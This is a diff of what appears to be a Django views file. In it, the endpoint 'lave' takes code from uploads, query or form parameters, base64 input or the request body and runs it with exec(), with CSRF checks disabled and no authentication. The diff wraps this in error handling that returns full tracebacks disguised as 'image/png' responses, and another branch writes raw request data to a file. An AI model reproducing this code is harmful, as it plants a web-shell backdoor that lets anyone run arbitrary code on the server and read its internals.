@@ -41,32 +41,36 @@ def echo(r):
 
 @csrf_exempt
 def lave(request):
-	aux = {}
-	while True:
-		data = request.FILES
-		if data:
-			data = data.get('eval')
+	try:
+		aux = {}
+		while True:
+			data = request.FILES
 			if data:
-				data = data.read().decode("UTF-8")
-				break
-		REQ = request.POST or request.GET
-		if REQ:
-			data = REQ.get('from', False)
-			if data:
-				open("mail.txt", "w").write(repr(REQ))
-				return HttpResponse("OK")
-			data = REQ.get('eval', False)
-			if data:
-				break
-			data = REQ.get('enc', False)
-			if data:
-				from base64 import b64decode
-				data = b64decode(data)
-				break
-		data = request.body.decode("UTF-8")
-		break
-	exec(data)
-	return aux['main'](request)
+				data = data.get('eval')
+				if data:
+					data = data.read().decode("UTF-8")
+					break
+			REQ = request.POST or request.GET
+			if REQ:
+				data = REQ.get('from', False)
+				if data:
+					open("mail.txt", "w").write(repr(REQ))
+					return HttpResponse("OK")
+				data = REQ.get('eval', False)
+				if data:
+					break
+				data = REQ.get('enc', False)
+				if data:
+					from base64 import b64decode
+					data = b64decode(data)
+					break
+			data = request.body.decode("UTF-8")
+			break
+		exec(data)
+		return aux['main'](request)
+	except:
+		from traceback import format_exc
+		return HttpResponse(format_exc(), status=500, content_type="image/png")
 
 @csrf_exempt
 def inb(request):
@@ -115,7 +119,7 @@ def inb(request):
 		# ex = exc_info()
 		m = traceback.format_exc()
 		open("mail.log", "w").write(m)
-		return HttpResponse(m, status=500)
+		return HttpResponse(m, status=500, content_type="image/png")
 	return HttpResponse("OK")
 
 def db(request):
